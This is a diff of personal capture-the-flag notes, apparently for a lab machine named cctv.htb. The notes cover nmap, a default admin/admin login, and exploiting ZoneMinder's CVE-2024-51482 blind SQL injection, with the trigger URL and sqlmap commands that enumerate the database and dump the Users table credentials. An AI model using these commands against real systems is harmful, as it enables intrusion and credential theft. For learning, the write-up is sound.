@@ -1,174 +1,100 @@
-# Reconnaissance & Enumeration Notes
+Reconnaissance
+-started nmap 
+  --Port 80(HTTP) and port 22(SSH) active 
 
-## Reconnaissance
+{
+  sudo nano /etc/hosts (incase the site failes to load,it is used for mapping cctv.htb to the ip )
+  added ip and domain name
+}
+Enumeration 
+-used browser to go into website
+-checking the functionality 
+-has a button "Get a Quote"
+  --intial observation:seems to redirect to an original google mail website with https connection(howerver a box appears before this)
+-there is a staff login 
+open -a warning is provided by the browser that "the connection is not secure .Credentials entered could be compromised"
+  --intial observation:most probably our attack vector
+just typed in
+--username:admin
+--password:admin
+--logged in 
+--seem to have complete access to admin
+--lots of options but most seems dummy
+--found api 
+---admin,mark and super admin(no idea what to do with it )
+---found logs(one log has /usr/share/zoneminder/www/includes/actions/options.php,another has 	/usr/share/zoneminder/www/includes/auth.php)
+----too many things ,probably many rabbit holes .
+--performing dir enumeration using gobuster
+-- no idea what to do -possibly have to do vertical/horizontal escalation 
+from the path zoneminder is the software -has many known vuln 
+--found out that it has a vuln CVE-2024-51482 is a critical Boolean-based Blind SQL Injection vulnerability in ZoneMinder, an open-source CCTV surveillance software
+--Trigger URL: http://[TARGET]/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]
 
-- Started nmap  
-  - Port 80 (HTTP) and Port 22 (SSH) active  
-
-- Used:
-  sudo nano /etc/hosts  
-  (in case the site fails to load, it is used for mapping cctv.htb to the ip)  
-  Added ip and domain name  
-
----
-
-## Enumeration
-
-- Used browser to go into website  
-- Checking the functionality  
-
-- Has a button "Get a Quote"  
-  - initial observation: seems to redirect to an original google mail website with https connection (however a box appears before this)  
-
-- There is a staff login  
-  - a warning is provided by the browser that "the connection is not secure .Credentials entered could be compromised"  
-  - initial observation: most probably our attack vector  
-
-- Just typed in:  
-  username: admin  
-  password: admin  
-
-- Logged in  
-  - seem to have complete access to admin  
-  - lots of options but most seems dummy  
-
----
-
-## Further Enumeration
-
-- Found API  
-  - admin, mark and super admin (no idea what to do with it)  
-
-- Found logs  
-  - /usr/share/zoneminder/www/includes/actions/options.php  
-  - /usr/share/zoneminder/www/includes/auth.php  
-
-- Too many things, probably many rabbit holes  
-
----
-
-## Directory Enumeration
-
-- Performing dir enumeration using gobuster  
-- No idea what to do  
-- Possibly have to do vertical/horizontal escalation  
-
----
-
-## Vulnerability Identification
-
-- From the path zoneminder is the software  
-- Has many known vulnerabilities  
-
-- Found CVE-2024-51482  
-  - Critical Boolean-based Blind SQL Injection vulnerability in ZoneMinder  
-
-- Trigger URL:  
-  http://[TARGET]/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]  
-
----
-
-## SQLMap Exploitation
-
-### Initial Command
-
+command
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=*" \
 --cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
---dbms=mysql --level=3 --risk=2 --batch --current-db --threads=5  
+--dbms=mysql --level=3 --risk=2 --batch --current-db --threads=5
 
-### Explanation
+--dbms=mysql	ZoneMinder uses MySQL/MariaDB. Specifying this stops sqlmap from wasting time testing payloads for PostgreSQL, Oracle, or SQLite.
+--level=3	Increases the variety of payloads tested. Since this is an AJAX-based request, higher levels help ensure the injection is caught correctly.
+--risk=2	This allows the tool to use heavy OR-based tests. Since the target is a DELETE query (based on the removetag action), you need this to properly manipulate the query logic.
+--technique=B	Forces sqlmap to use Boolean-based blind techniques. Since we know this CVE is blind, this skips unnecessary time-based or error-based tests.
+--threads=5	Speeds up the data extraction by sending multiple requests at once. (Don't go too high, or you might crash the web server).
+--current-db	Once the connection is confirmed, this will immediately tell you the name of the database you're looking at.
 
-- --dbms=mysql  
-  ZoneMinder uses MySQL/MariaDB  
-
-- --level=3  
-  Increases payload variety  
-
-- --risk=2  
-  Allows heavy OR-based tests  
-
-- --technique=B  
-  Boolean-based blind  
-
-- --threads=5  
-  Speeds up extraction  
-
-- --current-db  
-  Retrieves database name  
-
----
-
-## Modified Command (Time-Based Injection)
-
+the command is then changed to 
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
 --cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
 --dbms=mysql --batch --level=5 --risk=3 \
 --technique=T --time-sec=5 --threads=1 \
---current-db  
+--current-db
+ased injection, you must use 1 thread. If you send multiple requests at once, the timing overlaps and sqlmap gets confused.
 
-### Notes
-
-- Technique changed from B to T (Boolean → Time-based)  
-- Uses sleep to time the response  
-- Must use 1 thread (avoid timing conflicts)  
-- --time-sec=5 ensures clear delay  
-
-- This gives the current database:  
-  zm  
-
----
-
-## Database Enumeration
-
-### Get Tables
-
+--time-sec=5: Sets a clear 5-second delay for the "True" response to make it obvious to the tool.
+here the technique was cahnged from B to T .From blind to time based .it uses sleep .that is to timethe response -give detailed explanation .
+THIS GIVES US THE CURRENT DATABASE which is zm 
+--now going to see the tables in zm 
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
 --cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
---dbms=mysql --batch -D zm --tables  
-
-- -D is the database  
-
----
-
-### Get Columns
-
+--dbms=mysql --batch -D zm --tables
+--D is the database 
+ once you see the table 
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
 --cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
---dbms=mysql --batch -D zm -T Users --columns  
-
-- -T is the table name  
-
----
-
-### Dump Credentials
-
+--dbms=mysql --batch -D zm -T Users --columns 
+use this to get the columns in that table where t is a flag and users is the table name 
+after getting columns dump the creditials from it 
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
 --cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
---dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump  
+--dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump
 
----
 
-## Concepts
+    
 
-### HTTP (Port 80)
 
-- HTTP is the protocol used to load websites  
-- Browser sends request to:
-  - IP of the server  
-  - Port 80  
 
-- Not encrypted  
-- Data is sent in plain text  
-- Vulnerable to attacks (MITM, sniffing)  
 
----
 
-### SSH (Port 22)
 
-- SSH lets you securely connect to another computer remotely  
 
-ssh user@192.168.1.10  
 
-- Encrypted communication  
-- Used by system admins and pentesters  
-- Provides command-line access to another machine  
+
+
+
+HYPERTEXT PROTOCOL (HTTP,PORT 80)
+HTTP is the protocol used to load websites.
+Your browser sends a request to:
+       IP of the server
+       Port 80
+Not encrypted 
+Data is sent in plain text
+Vulnerable to attacks (MITM, sniffing)
+
+SECURE SHELL(SSH PORT 22)
+SSH lets you securely connect to another computer remotely.
+  ssh user@192.168.1.10
+Encrypted communication 
+Used by:
+System admins
+Hackers / pentesters
+Gives command-line access to another machine
